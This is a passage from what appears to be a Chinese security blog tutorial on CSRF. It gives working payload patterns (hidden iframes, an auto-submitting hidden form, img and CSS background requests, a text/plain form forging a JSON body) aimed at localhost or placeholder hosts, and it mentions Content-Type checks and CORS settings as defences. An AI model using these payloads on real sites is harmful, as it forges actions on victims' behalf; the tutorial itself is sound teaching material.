<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;请求地址，会被 http 请求到的位置，可以携带GET型参数&quot;</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1/csrf test/get _csrf/new_user.php？username=liuxiaoyang&amp;password=123456&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span>请点击我&lt;/a</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<h2 id="iframe-标签的-src">iframe 标签的 src</h2>
<p>iframe 标签内容将在页面加载过程中自动进行加载，src
指向的位置就是页面请求的位置 注意：可以设置 iframe 的
style-&gt;display:none，以此来不显示 iframe 加载的内容。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/csri_test/get_csrf/new_user.php？username=liuxiaoyang&amp;password=123456&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="隐藏的-iframe">隐藏的 iframe</h2>
<p>常用会返回信息的 POST 型 CSRF，使用隐藏的 iframe
进行攻击，就不会让受害者发现。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-frame&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">    <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">action</span>=<span class="string">&quot;https://xxx.com/delete&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">target</span>=<span class="string">&quot;csrf- frame&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;csrf-form&quot;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>开一个看不见的 iframe，让 form submit 之后的结果出现在 iframe
里面，而且这个 form 还可以自动 submit。</p>
<h2 id="img-标签的-src">img 标签的 src</h2>
<p>img 标签利用 img 标签的内容会随着页面加载而被请求，以此 src
指向的位置会在页面加载过程中进行请求。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/csrf test/get_csrf/new_user.php？username=liuxiaoyang&amp;password=123456&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="css-backgroud-利用">CSS-backgroud 利用</h2>
<p>可以利用 CSS 中 background 样式中的 url
来加载远程机器上的内容，从而对 url 中的内容发送 HTTP 请求 例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">background:#00FF00 url（&#x27;&#x27;）no-repeat fixed top；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;h1 style=&quot;background:url(&quot;http://127.0.0.1/csrf_test/get_csrf/new_user.php?username=123123&amp; password=123456&#x27;);&quot;&quot;&gt;CSRF</span><br><span class="line">POC&lt;/h1&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="构造-json">构造 JSON</h2>
<p>如果后端只接受 JSON 数据，<a
target="_blank" rel="noopener" href="https://docs.spring.io/spring-security/site/docs/current/reference/html/csrf.html">spring
的 document</a> 也可以构造（注：这个我没测试过 emm）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag">    <span class="attr">action</span>=<span class="string">&quot;https://small-min.blog.com/delete&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&#x27;&#123;&quot;id&quot;:3, &quot;deleteid&quot;:&quot;&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;2&quot;&#125;&#x27;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;delete!&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样子会产生如下的 request body：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span> <span class="attr">&quot;deleteid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>form</code>能够带的 content type
只有三种：<code>application/x-www-form-urlencoded</code>,
<code>multipart/form-data</code>跟<code>text/plain</code>。在上面的攻击中我们用的是最后一种，<code>text/plain</code>，如果你在你的后端
Server 有检查这个 content type 的话，是可以避免掉上面这个攻击的。</p>
</blockquote>
<p>如果你的 api 接受 cross origin 的 request ，即：你的 api
的<code>Access-Control-Allow-Origin</code>设成<code>*</code>的话，代表任何
domain 都可以发送 ajax 到你的 api server，这样无论你是改成 json，甚至把
method 改成 PUT, DELETE 都没有用。</p>
<p>XSS 与 CSRF</p>
<ol type="1">
<li><p>self xss 与 CSRF</p></li>
<li><p>一般 xss 与 csrf</p>
<p>通过 xss 可以获取 token，（因为像 script img link
等标签不受浏览器同源策略的影响，可以跨域。而一般标签是无法跨域的。），然后使用
token 与 csrf 伪造用户操作。</p></li>
</ol>
<h1 id="推荐资料">推荐资料</h1>
<p><a
target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/06/02/CSRF%E6%8C%87%E5%8C%97/">CSRF
指北</a></p>
</div><div class="tags"></div><div class="post-nav"><a class="pre" href="/blog/2019/10/05/programming/python/requests_basic/">Requests 基础</a><a class="next" href="/blog/2019/10/05/websec/logic_vuln/logic_vuln/">逻辑漏洞入门篇</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="author-info"><a class="info-avatar" href="/" title=""><img class="nofancybox" src="/blog/img/avatar.png"/></a><p>What keeps me alive is my love for people and life and my desire to explore the unknown</p><a class="info-icon" href="mailto:findrealyee@outlook.com" title="Email" target="_blank" style="margin-inline:5px"> <i class="fa fa-envelope-square" style="margin-inline:5px"></i></a><a class="info-icon" href="https://github.com/realyee/" title="Github" target="_blank" style="margin-inline:5px"> <i class="fa fa-github-square" style="margin-inline:5px"></i></a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/blog/categories/Cryptography/">Cryptography</a><span class="category-list-count">29</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/blog/categories/Cryptography/math/">math</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/Cryptography/zero-knowledge-proof/">zero-knowledge proof</a><span class="category-list-count">20</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/Golang/">Golang</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/academic/">academic</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/blockchain/">blockchain</a><span class="category-list-count">25</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/cplusplus/">cplusplus</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/go/">go</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/linux/">linux</a><span class="category-list-count">34</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/blog/categories/linux/git/">git</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/linux/macos/">macos</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/linux/tools/">tools</a><span class="category-list-count">12</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/misc/">misc</a><span class="category-list-count">16</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/blog/categories/misc/latex/">latex</a><span class="category-list-count">5</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/ml/">ml</a><span class="category-list-count">27</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/blog/categories/ml/rl/">rl</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/network/">network</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/os/">os</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/php/">php</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/probabilities/">probabilities</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/python/">python</a><span class="category-list-count">64</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/security-miscellaneous/">security miscellaneous</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/shell/">shell</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/utilities/">utilities</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/websec/">websec</a><span class="category-list-count">35</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/blog/categories/websec/cmd-execution/">cmd_execution</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/websec/file-upload/">file_upload</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/websec/logic-vuln/">logic_vuln</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/websec/sql-injection/">sql injection</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/websec/xss/">xss</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/wireshark/">wireshark</a><span class="category-list-count">7</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/blog/tags/academic/" style="font-size: 15px;">academic</a> <a href="/blog/tags/sci/" style="font-size: 15px;">sci</a> <a href="/blog/tags/jcr/" style="font-size: 15px;">jcr</a> <a href="/blog/tags/ml/" style="font-size: 15px;">ml</a> <a href="/blog/tags/cuda/" style="font-size: 15px;">cuda</a> <a href="/blog/tags/misc/" style="font-size: 15px;">misc</a> <a href="/blog/tags/vscode/" style="font-size: 15px;">vscode</a> <a href="/blog/tags/threat-intelligence/" style="font-size: 15px;">threat intelligence</a> <a href="/blog/tags/typing/" style="font-size: 15px;">typing</a> <a href="/blog/tags/distance/" style="font-size: 15px;">distance</a> <a href="/blog/tags/osi-sec/" style="font-size: 15px;">osi_sec</a> <a href="/blog/tags/smtp/" style="font-size: 15px;">smtp</a> <a href="/blog/tags/mail/" style="font-size: 15px;">mail</a> <a href="/blog/tags/Boot/" style="font-size: 15px;">Boot</a> <a href="/blog/tags/Computer/" style="font-size: 15px;">Computer</a> <a href="/blog/tags/FAT/" style="font-size: 15px;">FAT</a> <a href="/blog/tags/FDT/" style="font-size: 15px;">FDT</a> <a href="/blog/tags/os/" style="font-size: 15px;">os</a> <a href="/blog/tags/efi/" style="font-size: 15px;">efi</a> <a href="/blog/tags/Python/" style="font-size: 15px;">Python</a> <a href="/blog/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/blog/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 15px;">网络协议</a> <a href="/blog/tags/Wireshark%E5%8A%9F%E8%83%BD/" style="font-size: 15px;">Wireshark功能</a> <a href="/blog/tags/%E6%B8%97%E9%80%8F/" style="font-size: 15px;">渗透</a> <a href="/blog/tags/%E6%8A%93%E5%8C%85/" style="font-size: 15px;">抓包</a> <a href="/blog/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 15px;">计算机网络</a> <a href="/blog/tags/zkp/" style="font-size: 15px;">zkp</a> <a href="/blog/tags/circom/" style="font-size: 15px;">circom</a> <a href="/blog/tags/git/" style="font-size: 15px;">git</a> <a href="/blog/tags/ssh/" style="font-size: 15px;">ssh</a> <a href="/blog/tags/arch/" style="font-size: 15px;">arch</a> <a href="/blog/tags/manjaro/" style="font-size: 15px;">manjaro</a> <a href="/blog/tags/chmod/" style="font-size: 15px;">chmod</a> <a href="/blog/tags/ping/" style="font-size: 15px;">ping</a> <a href="/blog/tags/network/" style="font-size: 15px;">network</a> <a href="/blog/tags/find/" style="font-size: 15px;">find</a> <a href="/blog/tags/head/" style="font-size: 15px;">head</a> <a href="/blog/tags/tail/" style="font-size: 15px;">tail</a> <a href="/blog/tags/ioredirect/" style="font-size: 15px;">ioredirect</a> <a href="/blog/tags/pipe/" style="font-size: 15px;">pipe</a> <a href="/blog/tags/fd/" style="font-size: 15px;">fd</a> <a href="/blog/tags/iproute2/" style="font-size: 15px;">iproute2</a> <a href="/blog/tags/kill/" style="font-size: 15px;">kill</a> <a href="/blog/tags/hardlink/" style="font-size: 15px;">hardlink</a> <a href="/blog/tags/softlink/" style="font-size: 15px;">softlink</a> <a href="/blog/tags/netstat/" style="font-size: 15px;">netstat</a> <a href="/blog/tags/ss/" style="font-size: 15px;">ss</a> <a href="/blog/tags/lsof/" style="font-size: 15px;">lsof</a> <a href="/blog/tags/traceroute/" style="font-size: 15px;">traceroute</a> <a href="/blog/tags/vim/" style="font-size: 15px;">vim</a> <a href="/blog/tags/latex/" style="font-size: 15px;">latex</a> <a href="/blog/tags/CNN/" style="font-size: 15px;">CNN</a> <a href="/blog/tags/convolution/" style="font-size: 15px;">convolution</a> <a href="/blog/tags/CMake/" style="font-size: 15px;">CMake</a> <a href="/blog/tags/Make/" style="font-size: 15px;">Make</a> <a href="/blog/tags/php/" style="font-size: 15px;">php</a> <a href="/blog/tags/python/" style="font-size: 15px;">python</a> <a href="/blog/tags/re/" style="font-size: 15px;">re</a> <a href="/blog/tags/Regexp/" style="font-size: 15px;">Regexp</a> <a href="/blog/tags/shell/" style="font-size: 15px;">shell</a> <a href="/blog/tags/mysql/" style="font-size: 15px;">mysql</a> <a href="/blog/tags/pseudo-static/" style="font-size: 15px;">pseudo static</a> <a href="/blog/tags/sql-injection/" style="font-size: 15px;">sql injection</a> <a href="/blog/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/blog/tags/collection/" style="font-size: 15px;">collection</a> <a href="/blog/tags/collections/" style="font-size: 15px;">collections</a> <a href="/blog/tags/comprehensions/" style="font-size: 15px;">comprehensions</a> <a href="/blog/tags/fun/" style="font-size: 15px;">fun</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/blog/2023/09/18/ml/wasserstein_dist/">Delve into Wasserstein Distance, principles and implementation analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/09/17/math/probabilities/wasserstein_bg/">Probabilities background for Wasserstein Distance</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/08/11/academic/papers/ldp_location/">L-SRR Local Differential Privacy for Location-Based Services with Staircase Randomized Response</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/08/10/academic/papers/ldp_byz_fl/">Practical Differentially Private and Byzantine-resilient Federated Learning</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/08/04/academic/papers/fedrecover/">FedRecover 论文阅读笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/08/04/academic/papers/flcert/">FLCert Provably Secure Federated Learning against Poisoning Attacks 论文阅读笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/08/04/academic/papers/fltrust/">FLTrust Byzantine-robust Federated Learning via Trust Bootstrapping 论文阅读笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/05/30/crypto/zk/specific2program/">zk with programmability</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/04/30/crypto/zk/great_resource/">zk 资料汇总</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/04/16/misc/latex/latex_grammars/">常用 LaTeX 语法总结</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://snowolf0620.xyz/" title="snowolf0620" target="_blank">snowolf0620</a><ul></ul><a href="https://space.keter.top/" title="Sonder" target="_blank">Sonder</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2024 <a href="/blog/." rel="nofollow">realyee's blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/blog/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/latest/jquery.fancybox.min.js"></script><script type="text/javascript" src="/blog/js/fancybox.js?v=1.0.0"></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/latest/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/blog/css/search.css?v=1.0.0"><script type="text/javascript" src="/blog/js/search.js?v=1.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
  search_path = 'search.xml';
}
var path = '/blog/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="/blog/js/copycode.js?v=1.0.0" successtext="Copy Successed!"></script><link rel="stylesheet" type="text/css" href="/blog/css/copycode.css?v=1.0.0"><script type="text/javascript" src="/blog/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/blog/js/smartresize.js?v=1.0.0"></script></div></body></html>